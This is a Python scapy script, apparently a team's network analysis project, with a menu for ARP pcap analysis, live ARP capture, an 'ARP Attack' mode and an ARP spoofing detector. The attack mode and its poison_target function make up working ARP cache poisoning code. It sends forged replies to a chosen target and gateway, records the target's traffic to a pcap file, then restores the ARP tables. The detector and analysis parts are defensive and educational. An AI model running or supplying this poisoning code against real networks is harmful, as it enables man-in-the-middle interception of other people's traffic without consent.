import argparse  # Importing argument parser for commandline
import logging
from netifaces import AF_INET, ifaddresses, interfaces
import os
import sys
import time
from multiprocessing import Process
import winreg as wr
from pprint import pprint
from sys import platform

from scapy.all import *


# A useful function that searches for a certain word in a string and returns it
def findwholeword(arg):
    return re.compile(r'\b({0})\b'.format(arg), flags=re.IGNORECASE).search

def textcleanup(arg):
    # Looks for parsemode in the arglist and cleans up any unwanted special characters using REGEX
    textcleanup = re.sub(r'[^\w]', '', str(arg))
    # After the string has been cleanup, then we return the string specified
    return textcleanup


def boolcleanup(arg):
    # Looks for parsemode in the arglist and cleans up any unwanted special characters using REGEX
    boolcleanup = re.sub(r'[^\w]', '', str(arg))
    # After the string has been cleanup, then we return the string specified
    if boolcleanup == "True" or boolcleanup == "true":
        return True
    else:
        return False

def filenamecleanup(arg):
    # Looks for filename in the arglist and cleans up any unwanted special characters using REGEX
    cleanfilename = re.sub(r'[^\w. ]', '', str(arg))
    # After the string has been cleanup, then we return the string specified
    return "data/" + str(cleanfilename)

# Get args is perhaps one of the most important functions in this entire code
def getargs():
    # create parser object
    parser = argparse.ArgumentParser(description="A network analysis tool developed by Team Hercules.")

    #  These create the commands in console, the variables and their defaults, and other information
    parser.add_argument("-lc", "--livecapture", type=str, nargs=1,
                        metavar="livecapture", default="False",
                        help="Gathers new data as soon as the program starts. \n "
                             "If set to false, it will read whatever file you put under --filename <target> \n"
                             "Default: False")
    parser.add_argument("-pc", "--packetcount", type=str, nargs=1,
                        metavar="packetcount", help="Sets the packet count before program stops. Default: 200",
                        default="200")

    parser.add_argument("-fn", "--filename", type=str, nargs=1,
                        metavar='filename', default="Pom",
                        help="Name of the file. Default: Data.pcap")

    parser.add_argument("-p", "--parsemode", type=str, nargs=1,
                        metavar='parsemode', default="True",
                        help="Should the program parse the packets? Default: True")

    parser.add_argument("-v", "--verbose", type=str, nargs=1,
                        metavar='verbose', default="True",
                        help="Should the program give more detail? Default: False")

    parser.add_argument("-i", "--input", type=str, nargs=1,
                        metavar='input', default="True",
                        help="Should the program switch to input? Default: False")

    args = vars(parser.parse_args())  # We gather the arguments above and turn them into variables
    return args  # Returns the args as a list so we can parse later


def getpackets(livecapturearg, packetcountarg, filenamearg):
    if livecapturearg:  # If we're capturing data live..
        packets = sniff(count=packetcountarg, filter="ARP")  # sniff packets at the specified packetcount
        wrpcap(filenamearg, packets)  # Then write the data into the specified filename and the packets
        return packets  # Return all the packets recieved just now
    else:
        packets = rdpcap(filenamearg)  # Read the packets from a specified file
        return packets  # Return the packets read from the file


# Here is where the real action happens
def filterpackets(packets):
    # For every packet in the group of packets..
    for pkt in packets:
        try:
            print(str(pkt.show()))
        # Incase the packet is corrupted, just skip to the next packet
        except AttributeError:
            continue


def parsepacket(packets, verbosesetting):
    print()
    for counter, pkt in enumerate(packets):
        protocolcheck(pkt, counter, verbosesetting)


def protocolcheck(packet, counter, verbosesetting):
    if packet.haslayer(ARP):
        if bool(verbosesetting):
            print(
                " ############ Packet #{} ############# \n".format(counter + 1),
                "############## ARP Info ############# \n",
                "Hardware type: {}\n".format(gethwtype(packet)),
                "Protocol type: {}\n".format(getprototype(packet)),
                "Hardware Length: {}\n".format(gethwlength(packet)),
                "Protocol length: {}\n".format(getprotolength(packet)),
                "Operation: {}\n".format(getoperation(packet)),
                "Hardware source: {}\n".format(gethwsource(packet)),
                "Protocol source: {}\n".format(getprotosource(packet)),
                "Hardware destination: {}\n".format(gethwdest(packet)),
                "Protocol destination: {}\n".format(getprotodest(packet)),
            )
            print("########### ARP Connection ###########")
            print(arp_display(packet))
            print()
        else:
            print("########### ARP Connection [Packet #{}] ###########".format(counter + 1))
            print(arp_display(packet))
            print()
        ###[ ARP ]###
        # hwtype = 0x1
        # ptype = 0x800
        # hwlen = 6
        # plen = 4
        # op = who - has
        # hwsrc = d0:e1: 40:9f: b5:7a
        # psrc = 172.28.96.25
        # hwdst = 00:00: 00:00: 00:00
        # pdst = 172.28.96.132
    # else:
        # print("No ARP packets found in " + filename)

def arp_display(packet):
    if packet[ARP].op == 1:
        return "[*] [Request] {} is asking about {}".format(packet[ARP].psrc, packet[ARP].pdst)
    elif packet[ARP].op == 2:
        return "[*] [Response] {} is at {}".format(packet[ARP].psrc, packet[ARP].hwsrc)


def gethwtype(packet):
    hardwaretype = packet[ARP].hwtype
    if hardwaretype == 1:
        return str(hardwaretype) + " [Ethernet]"

    else:
        return str(packet[ARP].hwtype)


def getprototype(packet):
    return str(packet[ARP].ptype) + " [IP]"


def gethwlength(packet):
    return str(packet[ARP].hwlen) + " bits"


def getprotolength(packet):
    return str(packet[ARP].plen) + " bits"


def getoperation(packet):
    operation = packet[ARP].op

    if operation == 1:
        return str(operation) + " [Request]"
    elif operation == 2:
        return str(operation) + " [Reply]"
    else:
        return str(operation)


def gethwsource(packet):
    return str(packet[ARP].hwsrc)


def getprotosource(packet):
    return str(packet[ARP].psrc)


def gethwdest(packet):
    return str(packet[ARP].hwdst)


def getprotodest(packet):
    return str(packet[ARP].pdst)


def getsport(packet):
    if packet.haslayer(ARP):
        return str(packet[0][ARP].sport)
    else:
        return None


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=2, retry=10)

    # return the MAC address from a response
    for s, r in responses:
        return r[Ether].src
    return None


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # slightly different method using send
    print("[*] Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
            break

    print("[*] ARP poison attack finished.")
    return

def getbroadcast(arg):
    try:
        broadcast = arg[AF_INET][0]["broadcast"]
        return broadcast
    except KeyError:
        print("Cannot read address address on interface {}".format(interface))

def getlocal_ip(arg):
    try:
        local_ip = arg[AF_INET][0]["addr"]
        return local_ip
    except KeyError:
        print("Cannot read address address on interface {}".format(interface))


def getaddrs(arg):
    addrs = arg
    return addrs

livecapture = boolcleanup(getargs()['livecapture'])
packetcount = int(textcleanup(getargs()['packetcount']))
filename = filenamecleanup(getargs()['filename'])
parsemode = boolcleanup(getargs()['parsemode'])
verbose = boolcleanup(getargs()['verbose'])
input_var = boolcleanup(getargs()['input'])

# Number of ARP replies received from a specific mac before flagging it
request_threshold = 10

requests = []
replies_count = {}
interface = conf.iface


# Main function, pretty much prints out the variable settings.
def main():
    localpacketcount = packetcount
    localverbose = verbose
    localfilename = filename
    localinterface = conf.iface
    while True:
        print("[*] Type the number for the option you want to choose")
        print("[1] ARP File Analysis")
        print("[2] ARP Live Analysis")
        print("[3] ARP Attack")
        print("[4] ARP Spoofing Detector")

        decision = input("[?] ")
        if decision == "Exit" or decision == "exit":
            exit()

        elif textcleanup(decision) == "1":
            print("########## ARP File Analysis ##########")
            time.sleep(1)
            print()
            time.sleep(1)
            print("########## Settings ##########")
            while True:
                time.sleep(1)
                print("What is the filename of the pcap file? Default: " + str(localfilename) + " (Value: [Name])")
                filechoice = input()

                if filechoice == "":
                    print("[*] Using default filename: " + localfilename)
                    break
                else:
                    localfilename = filenamecleanup(filechoice)
                    print("[*] Filename has been set to " + localfilename)
                    break
            print("Enable simple packet analysis? Default: " + str(parsemode) + " (Value: [True/False])")
            temp = True
            while True:
                if temp:
                    choice = input()
                else:
                    choice = str(parsemode)
                if choice == "True" or choice == "true":
                    time.sleep(1)
                    print("[*] Simple packet analysis is enabled")
                    while True:
                        time.sleep(.5)
                        print()
                        time.sleep(.5)
                        print("Enable verbose mode for simple packet analysis? Default: " + str(
                            verbose) + " (Value: [True/False])")
                        verbosechoice = input()
                        if textcleanup(verbosechoice) == "True" or verbosechoice == "true":
                            time.sleep(1)
                            print("[*] Verbose mode has been enabled")
                            localverbose = True
                            break
                        elif textcleanup(verbosechoice) == "False" or verbosechoice == "false":
                            time.sleep(1)
                            print("[*] Verbose mode has been disabled")
                            localverbose = False
                            break
                        else:
                            time.sleep(1)
                            print("[*] Using default setting [Verbose mode: " + str(localverbose) + "]")
                            break
                    time.sleep(1)
                    print("[*] Scanning... This might take some time")
                    parsepacket(getpackets(False, None, localfilename), boolcleanup(localverbose))
                    time.sleep(1)
                    print()
                    time.sleep(1)
                    runagainchoice = input("Run again? Default: No (Value: [Yes/No])")
                    if runagainchoice == "Yes" or runagainchoice == "yes":
                        print()
                        continue
                    else:
                        print()
                        break

                elif choice == "False" or choice == "false":
                    time.sleep(1)
                    print("[*] Simple packet analysis is disabled")
                    time.sleep(1)
                    print()
                    time.sleep(1)
                    print("[*] Scanning... This might take some time")
                    filterpackets(getpackets(False, None, localfilename))
                    time.sleep(1)
                    print()
                    time.sleep(1)
                    runagainchoice = input("Run again? Default: No (Value: [Yes/No])")
                    if runagainchoice == "Yes" or runagainchoice == "yes":
                        print()
                        continue
                    else:
                        print()
                        break
                else:
                    print("[*] Using default setting [Parse Mode: " + str(parsemode) + "]")
                    temp = False
                    continue

        elif textcleanup(decision) == "2":
            print()
            time.sleep(1)
            print("########## ARP Live Analysis ##########")
            print()
            time.sleep(1)
            print("########## Settings ##########")
            while True:
                time.sleep(1)
                print("What is the filename of the pcap file? Default: " + str(localfilename) + " (Value: [Name])")
                filechoice = input()

                if filechoice == "":
                    print("[*] Using default filename: " + localfilename)
                    break
                else:
                    localfilename = filenamecleanup(filechoice)
                    print("[*] Filename has been set to " + localfilename)
                    break
            # PACKET COUNT
            time.sleep(1)
            print()
            time.sleep(1)
            print("[?] How many packets should the program collect? Default: " + str(localpacketcount))
            numchoice = input()
            try:
                if int(textcleanup(numchoice)) > 0:
                    print("[*] Setting packet count to " + str(numchoice))
                    localpacketcount = numchoice
            except ValueError:
                print("[*] Using default setting [Packet count: " + str(localpacketcount) + "]")

            # PARSE MODE
            time.sleep(.5)
            print()
            time.sleep(.5)
            print("[?] Enable simple packet analysis? Default: " + str(parsemode) + " (Value: [True/False])")
            temp = True
            while True:
                if temp:
                    choice = input()
                else:
                    choice = str(parsemode)
                if choice == "True" or choice == "true":
                    print("[*] Simple packet analysis is enabled")
                    print()
                    print("[?] Enable verbose mode for simple packet analysis? Default: " + str(verbose) + " (Value: [True/False])")
                    verbosechoice = input()
                    if textcleanup(verbosechoice) == "True" or verbosechoice == "true":
                        print("[*] Verbose mode has been enabled")
                        localverbose = True
                    elif textcleanup(verbosechoice) == "False" or verbosechoice == "false":
                        print("[*] Verbose mode has been disabled")
                        localverbose = False
                    else:
                        print("[*] Using default setting [Verbose mode: " + str(localverbose) + "]")

                    time.sleep(1)
                    print()
                    time.sleep(1)
                    print("[*] Scanning... This might take some time")
                    parsepacket(getpackets(True, int(localpacketcount), localfilename), boolcleanup(localverbose))

                    print()
                    runagainchoice = input("[?] Run again? Default: No (Value: [Yes/No])")
                    if runagainchoice == "Yes" or runagainchoice == "yes":
                        print()
                        continue
                    else:
                        print()
                        break

                elif choice == "False" or choice == "false":
                    print("[*] Simple packet analysis is disabled")

                    print()
                    print("[*] Scanning... This might take some time")
                    filterpackets(getpackets(True, int(localpacketcount), None))

                    print()
                    runagainchoice = input("[?] Run again? Default: No (Value: [Yes/No])")
                    if runagainchoice == "Yes" or runagainchoice == "yes":
                        print()
                        continue
                    else:
                        print()
                        break
                else:
                    print("[*] Using default setting [Parse Mode: " + str(parsemode) + "]")
                    temp = False
                    continue

        elif textcleanup(decision) == "3":
            while True:
                print()
                print("[Windows] You can type ipconfig in command prompt to get the IPs required")
                target_ip = input("[?] Target IP: ")
                gateway_ip = input("[?] Gateway IP: ")

                print(("[*] Setting up %s" % localinterface))

                gateway_mac = get_mac(gateway_ip)

                if gateway_mac is None:
                    print("[!!!] Failed to get gateway MAC. Exiting")
                    time.sleep(3)
                    break
                else:
                    print(("[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)))

                target_mac = get_mac(target_ip)

                if target_mac is None:
                    print("[!!!] Failed to get target MAC. Exiting")
                    time.sleep(3)
                    break
                else:
                    print(("[*] Target %s is at %s" % (target_ip, target_mac)))

                time.sleep(2)
                print()
                print("[?] How many packets should the program collect? Default: " + str(
                    localpacketcount))

                numchoice = input()
                try:
                    if int(textcleanup(numchoice)) > 0:
                        print("[*] Setting packet count to " + str(numchoice))
                        localpacketcount = numchoice
                except ValueError:
                    print("[*] Using default setting [Packet count: " + str(localpacketcount) + "]")

                time.sleep(1)
                print()
                time.sleep(1)
                print("[?] What is the filename of the pcap file? Default: " + str(
                    localfilename) + " (Value: [Name] + .pcap)")
                filechoice = input()

                if filechoice == "":
                    print("[*] Using default filename: " + localfilename)
                else:
                    localfilename = filenamecleanup(filechoice)
                    print("[*] Filename has been set to " + localfilename)

                # start poison thread
                poison_thread = Process(target=poison_target,
                                        args=(gateway_ip, gateway_mac, target_ip, target_mac))
                poison_thread.start()

                try:
                    print(("[*] Starting sniffer for %d packets" % int(localpacketcount)))
                    bpf_filter = "ip host %s" % target_ip
                    packets = sniff(count=int(localpacketcount), filter=bpf_filter, iface=localinterface)
                    poison_thread.terminate()

                    # write out the captured packets
                    print("[*] Writing captured packets to " + localfilename)
                    wrpcap(localfilename, packets)

                    # restore the network
                    print("[*] Restoring network")
                    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
                    print()
                    print("[!] Attack successfully completed. Data is saved in " + localfilename)
                    print()

                    runagainchoice = input("[?] Run again? Default: No (Value: [Yes/No])")
                    if runagainchoice == "Yes" or runagainchoice == "yes":
                        print()
                        continue
                    else:
                        print()
                        break

                except KeyboardInterrupt:
                    # restore the network
                    print("[!!!] Keyboard activity detected, restoring network")
                    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
                    time.sleep(2)
                    break
        else:
            while True:
                print()
                # Read available network interfaces
                available_interfaces = interfaces()
                # Ask user for desired interface

                while True:
                    print("[*] Please select the interface you wish to use:")

                    list = []
                    numcounter = 0
                    for counter, getinterfaces in enumerate(available_interfaces):
                        list.append(getinterfaces[1:-1])
                        temp = str(getinterfaces[1:-1])
                        numcounter = counter
                        print("[" + str(numcounter + 1) + "] " + temp)

                    value = input("[?] ")
                    if int(value) <= numcounter + 1:
                        localinterface = list[int(value) - 1]
                        break
                    else:
                        time.sleep(1)
                        print("[!] Please use a real value")
                        time.sleep(1)
                        print()
                        continue

                # Check if specified interface is valid
                if not localinterface in available_interfaces:
                    print()
                    time.sleep(1)
                    print("[!] Interface {} not available.".format(localinterface))
                    time.sleep(1)
                    print()
                    break
                # Retrieve network addresses (IP, broadcast) from the network interfaces
                addrs = ifaddresses(localinterface)

                try:
                    local_ip = addrs[AF_INET][0]["addr"]
                    broadcast = addrs[AF_INET][0]["broadcast"]
                except KeyError:
                    print("[!] Cannot read address/broadcast address on interface {}".format(interface))
                    print()
                    break

                try:
                    print("[!] ARP Spoofing Scan has begun on {}".format(local_ip))
                    print("[*] Press CNTRL+C to stop the scan")

                    def check_spoof(source, source_mac, dest):
                        # Function checks if a specific ARP reply is part of an ARP spoof attack or not
                        if dest == broadcast:
                            if not source_mac in replies_count:
                                replies_count[source_mac] = 0

                        if not source in requests and source != local_ip:
                            if not source_mac in replies_count:
                                replies_count[source_mac] = 0
                            else:
                                replies_count[source_mac] += 1
                            # Logs ARP Reply
                            print("[*] ARP replies detected from MAC {}. Request count {}".format(source_mac, replies_count[
                                source_mac]))

                            if replies_count[source_mac] > request_threshold:
                                # Check number of replies reaches threshold or not, and whether or not we have sent a notification for this MAC addr
                                print("[!!!] ARP Spoofing Detected from MAC Address {}".format(
                                    source_mac))  # Logs the attack in the log file
                                # Issue OS Notification
                                # issue_os_notification("ARP Spoofing Detected", "The current network is being attacked.", "ARP Spoofing Attack Detected from {}.".format(mac))
                                # Add to sent list to prevent repeated notifications.
                                # notification_issued.append(mac)
                        else:
                            if source in requests:
                                requests.remove(source)

                    def packet_filter(packet):
                        # Retrieve necessary parameters from packet
                        source = packet.sprintf("%ARP.psrc%")
                        dest = packet.sprintf("%ARP.pdst%")
                        source_mac = packet.sprintf("%ARP.hwsrc%")
                        operation = packet.sprintf("%ARP.op%")
                        if source == local_ip:
                            requests.append(dest)
                        if operation == 'is-at':
                            return check_spoof(source, source_mac, dest)

                    sniff(filter="arp", prn=packet_filter, store=0)

                except KeyboardInterrupt:
                    print("[!] Stopping scan..")
                    time.sleep(2)
                    break


# Runs the main
if __name__ == "__main__":
    main()
